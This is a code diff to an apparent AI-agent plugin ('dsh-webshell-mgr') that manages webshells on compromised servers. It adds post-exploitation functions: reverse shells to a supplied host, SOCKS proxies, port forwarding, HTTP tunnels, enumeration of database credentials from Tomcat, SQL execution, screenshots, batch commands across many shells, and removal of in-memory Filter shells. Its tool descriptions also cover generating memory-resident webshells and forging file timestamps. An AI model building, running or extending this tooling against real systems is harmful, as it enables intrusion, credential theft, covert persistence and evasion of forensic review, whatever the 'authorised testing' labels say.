@@ -17,9 +17,10 @@ import { defineTool } from "@deepseek-ai/dsh-tools";
 import { openStore, saveConn, listConns, getConn, deleteConn, recordProbe, getState, setState, listDbProfiles, saveDbProfile, deleteDbProfile, recordGeneration, listGenerations, logOp, listOps } from "./store.js";
 import { protocolMeta, detectProtocol, probeConnection } from "./protocol/registry.js";
 import * as cap from "./protocol/capabilities.js";
-import { GEN_KINDS, makeAndSave, importFromFile } from "./generators.js";
+import { GEN_KINDS, makeAndSave, importFromFile, GEN_DIR } from "./generators.js";
 import { listPlugins, getPlugin, runPlugin, checkRunnable } from "./plugins-registry.js";
-import { readFileSync } from "node:fs";
+import { readFileSync, mkdirSync, writeFileSync } from "node:fs";
+import { join } from "node:path";
 
 const name = "dsh-webshell-mgr";
 const inject = ["tools", "webServer", "webRuntime", "agentPresets"];
@@ -131,8 +132,63 @@ async function fileCore(connId, action, a = {}) {
 			logOp(theStore(), conn.id, "file." + action, JSON.stringify(a).slice(0, 300));
 			return r;
 		}
+		case "zip": case "unzip": {
+			if (conn.protocol !== "behinder-java") throw new Error("ZIP 需 behinder-java 通道（java.util.zip 载荷）——其余通道走命令翻译（zip/unzip 命令）");
+			const r = await cap.zipAction(conn, action, String(a.path ?? ""), String(a.to ?? ""));
+			logOp(theStore(), conn.id, "file." + action, `${a.path} → ${a.to}`);
+			return { ok: true, output: r };
+		}
+		case "shot": {
+			const png = await cap.screenshot(conn);
+			const name = `shot-${Date.now().toString(36)}.png`;
+			const dir = join(GEN_DIR(BASE_DIR));
+			mkdirSync(dir, { recursive: true });
+			const filePath = join(dir, name);
+			writeFileSync(filePath, png);
+			logOp(theStore(), conn.id, "file.shot", filePath);
+			return { ok: true, filePath, size: png.length };
+		}
 		default: throw new Error(`未知文件操作 ${action}`);
 	}
+}
+
+/** 档案 → JDBC 参数（驱动类名映射，目标机需自带对应驱动 jar）。 */
+function jdbcArgsOf(profile) {
+	const host = String(profile.host ?? "127.0.0.1");
+	const port = String(profile.port ?? "");
+	const db = String(profile.database ?? "");
+	const map = {
+		mysql: {
+			url: `jdbc:mysql://${host}${port ? ":" + port : ""}/${db}?useSSL=false&allowPublicKeyRetrieval=true&characterEncoding=utf8`,
+			driver: "com.mysql.cj.jdbc.Driver"
+		},
+		mssql: {
+			url: `jdbc:sqlserver://${host}${port ? ":" + port : ""};databaseName=${db};encrypt=false`,
+			driver: "com.microsoft.sqlserver.jdbc.SQLServerDriver"
+		},
+		pgsql: {
+			url: `jdbc:postgresql://${host}${port ? ":" + port : ""}/${db}`,
+			driver: "org.postgresql.Driver"
+		},
+		oracle: {
+			url: `jdbc:oracle:thin:@${host}${port ? ":" + port : ""}${db ? ":" + db : ""}`,
+			driver: "oracle.jdbc.driver.OracleDriver"
+		}
+	};
+	const m = map[profile.type] ?? map.mysql;
+	return { url: m.url, username: String(profile.username ?? ""), password: String(profile.password ?? ""), driver: m.driver };
+}
+
+/** 档案 → ADO.NET 参数（连接串按引擎拼装；驱动探测在载荷侧）。 */
+function adonetArgsOf(profile) {
+	const host = String(profile.host ?? "127.0.0.1");
+	const port = String(profile.port ?? "");
+	const db = String(profile.database ?? "");
+	if (profile.type === "sqlite") return { u: `Data Source=${db};Version=3` };
+	if (profile.type === "mssql") return { u: `Server=${host}${port ? "," + port : ""};Database=${db};User ID=${profile.username ?? ""};Password=${profile.password ?? ""};Integrated Security=false` };
+	if (profile.type === "pgsql") return { u: `Host=${host};Port=${port || "5432"};Username=${profile.username ?? ""};Password=${profile.password ?? ""};Database=${db}`, d: "Npgsql", t: "Npgsql.NpgsqlConnection" };
+	// mysql 默认（MySql.Data 在目标 bin/GAC）
+	return { u: `Server=${host};Port=${port || "3306"};Database=${db};Uid=${profile.username ?? ""};Pwd=${profile.password ?? ""}` };
 }
 
 async function dbCore(connId, action, a = {}) {
@@ -143,9 +199,62 @@ async function dbCore(connId, action, a = {}) {
 	}
 	if (action === "profile.save") return { profile: saveDbProfile(theStore(), connId, a) };
 	if (action === "profile.delete") { deleteDbProfile(theStore(), connId, String(a.id ?? "")); return { ok: true }; }
+	if (action === "enum") {
+		if (conn.protocol !== "behinder-java") throw new Error("数据源枚举需 behinder-java 通道（Tomcat JNDI 反射载荷）");
+		const r = await cap.enumDataSources(conn);
+		logOp(theStore(), conn.id, "db.enum", `${(r.resources ?? []).length} resources`);
+		return r;
+	}
 	const profile = listDbProfiles(theStore(), connId).find((x) => x.id === String(a.profileId ?? ""));
 	if (!profile) throw new Error("数据库档案不存在——先 profile.save");
 	const conn2 = conn;
+	// behinder-aspx 通道：U 载荷走反射 ADO.NET（目标 bin/GAC 驱动）
+	if (conn.protocol === "behinder-aspx") {
+		const D = adonetArgsOf(profile);
+		switch (action) {
+			case "dbs": case "tables": case "tableinfo":
+				throw new Error("ASPX 通道暂列库/表走 SQL 查询（如 sqlite: SELECT name FROM sqlite_master；mysql: SHOW DATABASES）");
+			case "exec": {
+				const { sendAsm } = await import("./protocol/behinder-aspx.js");
+				let out;
+				try { out = JSON.parse(await sendAsm(conn, "db", D)); }
+				catch (e) { throw new Error(`SQL 执行失败：${e.message}`); }
+				logOp(theStore(), conn.id, "db.exec", String(a.sql ?? "").slice(0, 300) + "(ado.net)");
+				return out;
+			}
+			default: throw new Error(`未知数据库操作 ${action}`);
+		}
+	}
+	// behinder-java 通道：WsmDb 载荷走 JDBC（目标应用自带驱动 jar 即可直连）
+	if (conn.protocol === "behinder-java") {
+		const D = jdbcArgsOf(profile);
+		switch (action) {
+			case "dbs": {
+				const r = await cap.javaDb(conn, "catalogs", D);
+				if (r.error) throw new Error(`库列表失败：${r.error}`);
+				logOp(theStore(), conn.id, "db.dbs", profile.type + "(jdbc)");
+				return { databases: r };
+			}
+			case "tables": {
+				const r = await cap.javaDb(conn, "tables", { ...D, database: String(a.database ?? profile.database ?? "") });
+				if (r.error) throw new Error(`表列表失败：${r.error}`);
+				logOp(theStore(), conn.id, "db.tables", `${a.database ?? profile.database}(jdbc)`);
+				return { tables: (Array.isArray(r) ? r : []).map((t) => t.name) };
+			}
+			case "tableinfo": {
+				const r = await cap.javaDb(conn, "columns", { ...D, database: String(a.database ?? profile.database ?? ""), table: String(a.table ?? "") });
+				if (r.error) throw new Error(`表结构失败：${r.error}`);
+				return { columns: r };
+			}
+			case "exec": {
+				const r = await cap.javaDb(conn, "exec", { ...D, sql: String(a.sql ?? "") });
+				logOp(theStore(), conn.id, "db.exec", String(a.sql ?? "").slice(0, 300) + "(jdbc)");
+				if (r.error) throw new Error(`SQL 执行失败：${r.error}`);
+				return r;
+			}
+			default: throw new Error(`未知数据库操作 ${action}`);
+		}
+	}
 	switch (action) {
 		case "dbs": {
 			const dbs = await cap.dbDatabases(conn2, profile);
@@ -303,6 +412,9 @@ export async function dispatch(ctx, st, endpoint, payload) {
 		case "meta": return { protocols: protocolMeta(), allowedModes: ALLOWED_MODES };
 		case "conn.list": return { connections: listConns(st).map(publicConn) };
 		case "conn.save": {
+			const { validateProfile } = await import("./protocol/profile.js");
+			const v = validateProfile(p.profile_json);
+			if (!v.ok) throw new Error(v.error);
 			const saved = saveConn(st, p);
 			cap.invalidateConn(saved.id);
 			return { conn: publicConn(saved) };
@@ -315,6 +427,77 @@ export async function dispatch(ctx, st, endpoint, payload) {
 		}
 		case "conn.detect": return detectProtocol({ url: p.url, password: p.password, secretKey: p.secretKey, passParam: p.passParam, cmdParam: p.cmdParam, method: p.method, timeoutMs: p.timeoutMs });
 		case "conn.connect": return connectCore(p);
+		case "term.action": {
+			const conn = connOrThrow(String(p.connId ?? ""));
+			if (conn.protocol !== "godzilla-java") throw new Error("交互会话终端需 godzilla-java 通道（WsmG e.* ops）");
+			const { call } = await import("./protocol/godzilla-java.js");
+			const action = String(p.action ?? "");
+			if (action === "open") {
+				const tid = (await call(conn, "e.open", { c: String(p.cmdline ?? "") })).toString("utf8");
+				return { tid };
+			}
+			if (action === "write") {
+				await call(conn, "e.w", { c: String(p.tid ?? ""), d: Buffer.from(String(p.data ?? ""), "utf8") });
+				return { ok: true };
+			}
+			if (action === "read") {
+				const r = await call(conn, "e.r", { c: String(p.tid ?? "") });
+				return { exited: r.length > 0 && r[0] === 1, data: r.subarray(1).toString("utf8") };
+			}
+			if (action === "close") {
+				await call(conn, "e.x", { c: String(p.tid ?? "") });
+				return { ok: true };
+			}
+			throw new Error(`未知终端动作 ${action}`);
+		}
+		case "net.action": {
+			const conn = connOrThrow(String(p.connId ?? ""));
+			const out = await cap.netAction(conn, String(p.kind ?? ""), {
+				port: p.port, listen: p.listen, host: p.host, any: p.any
+			});
+			logOp(theStore(), conn.id, "net." + p.kind, JSON.stringify({ port: p.port, listen: p.listen, host: p.host }).slice(0, 200));
+			return { ok: true, output: out };
+		}
+		case "tunnel.start": {
+			const conn = connOrThrow(String(p.connId ?? ""));
+			if (conn.protocol !== "godzilla-java") throw new Error("HTTP 隧道需 godzilla-java 通道（会话态 dispatcher 存隧道连接表）");
+			const { startTunnel } = await import("./protocol/tunnel.js");
+			const r = await startTunnel(conn, Number(p.localPort ?? 0));
+			logOp(theStore(), conn.id, "tunnel.start", `local :${p.localPort}`);
+			return r;
+		}
+		case "tunnel.stop": {
+			const { stopTunnel } = await import("./protocol/tunnel.js");
+			return stopTunnel(Number(p.localPort ?? 0));
+		}
+		case "tunnel.status": {
+			const { tunnelStatus } = await import("./protocol/tunnel.js");
+			return { tunnels: tunnelStatus() };
+		}
+		case "conn.batch": {
+			const ids = Array.isArray(p.ids) ? p.ids.map(String) : [];
+			const command = String(p.command ?? "");
+			if (!ids.length || !command) throw new Error("ids 与 command 必填");
+			const results = [];
+			for (const id of ids) {
+				try {
+					const conn = connOrThrow(id);
+					const output = await cap.runCommand(conn, command);
+					results.push({ id, name: conn.name, ok: true, output: String(output).slice(0, 2000) });
+				} catch (e) {
+					results.push({ id, ok: false, error: e?.message ?? String(e) });
+				}
+			}
+			logOp(theStore(), "batch", "conn.batch", `${ids.length} conns: ${command.slice(0, 100)}`);
+			return { results };
+		}
+		case "mem.unload": {
+			const conn = connOrThrow(String(p.connId ?? ""));
+			if (conn.protocol !== "behinder-java") throw new Error("内存马卸载需 behinder-java 通道（载荷经 defineClass 执行——X-C 头通道只能跑命令）");
+			const out = await cap.memUnload(conn, String(p.name ?? ""));
+			logOp(theStore(), conn.id, "mem.unload", out);
+			return { ok: true, output: out };
+		}
 		case "conn.probe": {
 			const conn = connOrThrow(String(p.id ?? ""));
 			const r = await probeConnection(conn);
@@ -345,7 +528,7 @@ export async function dispatch(ctx, st, endpoint, payload) {
 function registerTools(ctx) {
 	ctx.tools.register(defineTool({
 		name: "webshell_generate",
-		description: "生成基础/自研加密 webshell 源码（仅授权测试）。php-oneliner（eval 通道一句话）/ php-basic（口令门+命令通道）/ php-aes1|php-aes2（自研加密马 v1=c/u/d、v2=+eval 结构化能力）/ jsp-basic / jsp-aes1 / aspx-basic / aspx-aes1。返回源码+落盘路径+连接提示；免杀变体请走免杀对抗模式。",
+		description: "生成基础/自研加密/冰蝎型 webshell 源码（仅授权测试）。php-oneliner（eval 通道一句话）/ php-basic（口令门+命令通道）/ php-aes1|php-aes2（自研加密马 v1=c/u/d、v2=+eval 结构化能力）/ php-behinder|php-godzilla（生态兼容型）/ jsp-basic / jsp-aes1 / jsp-behinder（冰蝎型 JSP·behinder-java 通道）/ jsp-mem-filter（Tomcat Filter 内存马引导器：上传访问一次即注入，删文件连接仍在）/ aspx-basic / aspx-aes1。返回源码+落盘路径+连接提示；免杀变体请走免杀对抗模式。",
 		parameters: {
 			kind: { type: "string", required: true, enum: Object.keys(GEN_KINDS), description: "生成类型" },
 			name: { type: "string", description: "产物名（默认 kind+时间戳）" },
@@ -364,7 +547,7 @@ function registerTools(ctx) {
 
 	ctx.tools.register(defineTool({
 		name: "webshell_connect",
-		description: "登记并连接一个 webshell（仅授权测试）：给定 URL+口令(+盐)自动识别协议（自研加密/一句话 eval/命令通道/魔改冰蝎/魔改哥斯拉），探测 OS 与基本信息，登记进「webshell 管理」页。返回连接 id 供 exec/file/db/plugin 工具使用。",
+		description: "登记并连接一个 webshell（仅授权测试）：给定 URL+口令(+盐)自动识别协议（自研加密/一句话 eval/命令通道/冰蝎 PHP·JSP/哥斯拉/魔改变体/内存马 X-C），探测 OS 与基本信息，登记进「webshell 管理」页。内存马：URL 填任意存活路径（Filter/Module 全站劫持；Spring Controller 型填注入器返回的伪装路径），自动识别命中后按内存马形态登记。返回连接 id 供 exec/file/db/plugin 工具使用。",
 		parameters: {
 			url: { type: "string", required: true, description: "webshell 地址（含协议 http(s)://）" },
 			password: { type: "string", description: "口令 / X-T / X-G 值（按协议）" },
@@ -410,7 +593,7 @@ function registerTools(ctx) {
 
 	ctx.tools.register(defineTool({
 		name: "webshell_file",
-		description: "webshell 文件操作（仅授权测试）。action=ls/read/write/delete/delete-dir/mkdir/mv/chmod/touch/stat/wget/roots。read 返回 base64；write 传 base64（自动分块）；touch 伪造时间戳（epoch 秒）；wget 从 URL 拉文件到目标机。工具上传属环境改动——进操作痕迹台账（本工具每次操作已记 op_log）。",
+		description: "webshell 文件操作（仅授权测试）。action=ls/read/write/delete/delete-dir/mkdir/mv/chmod/touch/stat/wget/roots/zip/unzip（behinder-java）/shot（截屏，产物落 generated/。read 返回 base64；write 传 base64（自动分块）；touch 伪造时间戳（epoch 秒）；wget 从 URL 拉文件到目标机。工具上传属环境改动——进操作痕迹台账（本工具每次操作已记 op_log）。",
 		parameters: {
 			conn_id: { type: "string", required: true, description: "连接 id" },
 			action: { type: "string", required: true, enum: ["ls", "read", "write", "delete", "delete-dir", "mkdir", "mv", "copy", "chmod", "touch", "stat", "wget", "roots"], description: "操作" },
@@ -432,12 +615,12 @@ function registerTools(ctx) {
 
 	ctx.tools.register(defineTool({
 		name: "webshell_db",
-		description: "webshell 数据库操作（仅授权测试，需 eval 能力通道=PHP eval 马或自研加密马 v2）。action=profile.save/dbs/tables/tableinfo/exec。先 profile.save 存连接档案（type=mysql/pgsql/sqlite/mssql + host/port/username/password/database），再 dbs→tables→exec。",
+		description: "webshell 数据库操作（仅授权测试）。通道要求：PHP 系走 eval 能力（eval 马/自研 v2，目标机 PDO）；behinder-java 通道走 JDBC（目标应用自带驱动 jar 即可，含 mysql/mssql/pgsql/oracle）。action=profile.save/dbs/tables/tableinfo/exec。先 profile.save 存连接档案（type=mysql/pgsql/sqlite/mssql/oracle + host/port/username/password/database），再 dbs→tables→exec。",
 		parameters: {
 			conn_id: { type: "string", required: true, description: "连接 id" },
-			action: { type: "string", required: true, enum: ["profile.save", "dbs", "tables", "tableinfo", "exec"], description: "操作" },
+			action: { type: "string", required: true, enum: ["profile.save", "dbs", "tables", "tableinfo", "exec", "enum"], description: "操作（enum=目标应用数据源凭据枚举，behinder-java）" },
 			profile_id: { type: "string", description: "数据库档案 id（save 之外必填）" },
-			type: { type: "string", enum: ["mysql", "pgsql", "sqlite", "mssql"], description: "引擎类型（save 用）" },
+			type: { type: "string", enum: ["mysql", "pgsql", "sqlite", "mssql", "oracle"], description: "引擎类型（save 用；oracle 仅 behinder-java/JDBC）" },
 			host: { type: "string", description: "主机（save 用；sqlite 传文件路径到 database）" },
 			port: { type: "integer", description: "端口（save 用）" },
 			username: { type: "string", description: "用户名（save 用）" },
@@ -454,6 +637,59 @@ function registerTools(ctx) {
 		}
 	}));
 
+	ctx.tools.register(defineTool({
+		name: "webshell_net",
+		description: "webshell 网络动作（仅授权测试；behinder-java 通道=目标侧载荷，godzilla-java 通道=HTTP 隧道）。kind: socks（目标侧 SOCKS5 无鉴权，port=监听端口，any=绑 0.0.0.0）/ fwd（端口转发：listen 监听端口 → host:port）/ reverse（反弹 shell：回连 host:port）/ tunnel.start（HTTP 隧道：localPort 本地 SOCKS5，全部流量封装 web 请求，需 godzilla-java）/ tunnel.stop（localPort）/ tunnel.status。",
+		parameters: {
+			conn_id: { type: "string", description: "连接 id" },
+			kind: { type: "string", required: true, enum: ["socks", "fwd", "reverse", "tunnel.start", "tunnel.stop", "tunnel.status"], description: "动作" },
+			port: { type: "integer", description: "socks=目标监听端口 / fwd=转发目标端口 / reverse=回连端口" },
+			listen: { type: "integer", description: "fwd=目标监听端口 / tunnel=本地 SOCKS 端口" },
+			host: { type: "string", description: "fwd=目标主机 / reverse=回连主机" },
+			any: { type: "boolean", description: "socks/fwd 绑定 0.0.0.0（默认仅目标本机）" }
+		},
+		output: { schema: { type: "object", additionalProperties: true, properties: { ok: { type: "boolean", required: true } } }, render: (_a, v) => [{ type: "text", text: v.ok ? String(v.output ?? JSON.stringify(v)) : `失败：${v.error}` }] },
+		execute(args, exec) {
+			const g = modeGuard(ctx, exec);
+			if (!g.ok) return Promise.resolve({ ok: false, error: g.error });
+			return dispatch(ctx, theStore(), args.kind.startsWith("tunnel") ? args.kind : "net.action", {
+				connId: args.conn_id, kind: args.kind, port: args.port, listen: args.listen, host: args.host, any: args.any, localPort: args.listen ?? args.port
+			}).then((r) => ({ ok: true, ...r })).catch((e) => ({ ok: false, error: e?.message ?? String(e) }));
+		}
+	}));
+
+	ctx.tools.register(defineTool({
+		name: "webshell_batch_exec",
+		description: "多连接批量执行命令（仅授权测试）：对多个已登记 webshell 并发面逐个执行同一命令，返回各连接结果（输出截 2000 字）。",
+		parameters: {
+			conn_ids: { type: "array", items: { type: "string" }, required: true, description: "连接 id 列表" },
+			command: { type: "string", required: true, description: "OS 命令" }
+		},
+		output: { schema: { type: "object", additionalProperties: true, properties: { ok: { type: "boolean", required: true } } }, render: (_a, v) => [{ type: "text", text: v.ok ? (v.results ?? []).map((r) => `${r.name ?? r.id}: ${r.ok ? String(r.output).slice(0, 300) : "失败 " + r.error}`).join("\n") : `失败：${v.error}` }] },
+		execute(args, exec) {
+			const g = modeGuard(ctx, exec);
+			if (!g.ok) return Promise.resolve({ ok: false, error: g.error });
+			return dispatch(ctx, theStore(), "conn.batch", { ids: args.conn_ids, command: args.command })
+				.then((r) => ({ ok: true, results: r.results })).catch((e) => ({ ok: false, error: e?.message ?? String(e) }));
+		}
+	}));
+
+	ctx.tools.register(defineTool({
+		name: "webshell_mem_unload",
+		description: "卸载内存马（仅授权测试；behinder-java 通道）。从 Tomcat StandardContext 移除动态 Filter 的三注册面（filterConfigs/filterDefs/filterMaps）。name 留空 = 读引导器登记的 x-n 属性（本插件 jsp-mem-filter 引导器注入的马可自动定位）；卸载后该连接即断（预期行为），动作入 op_log 台账。",
+		parameters: {
+			conn_id: { type: "string", required: true, description: "内存马连接 id（behinder-java 通道）" },
+			name: { type: "string", description: "Filter 名（留空 = 自动读 x-n 登记）" }
+		},
+		output: { schema: { type: "object", additionalProperties: true, properties: { ok: { type: "boolean", required: true } } }, render: (_a, v) => [{ type: "text", text: v.ok ? String(v.output ?? "") : `卸载失败：${v.error}` }] },
+		execute(args, exec) {
+			const g = modeGuard(ctx, exec);
+			if (!g.ok) return Promise.resolve({ ok: false, error: g.error });
+			return dispatch(ctx, theStore(), "mem.unload", { connId: args.conn_id, name: args.name })
+				.then((r) => ({ ok: true, output: r.output }))
+				.catch((e) => ({ ok: false, error: e?.message ?? String(e) }));
+		}
+	}));
 	ctx.tools.register(defineTool({
 		name: "webshell_plugin_list",
 		description: "列出已安装的 webshell 载荷插件（声明式清单：名称/语言/通道/参数表单）。用户可用自然语言要求运行某个插件——先看本清单确认参数。",
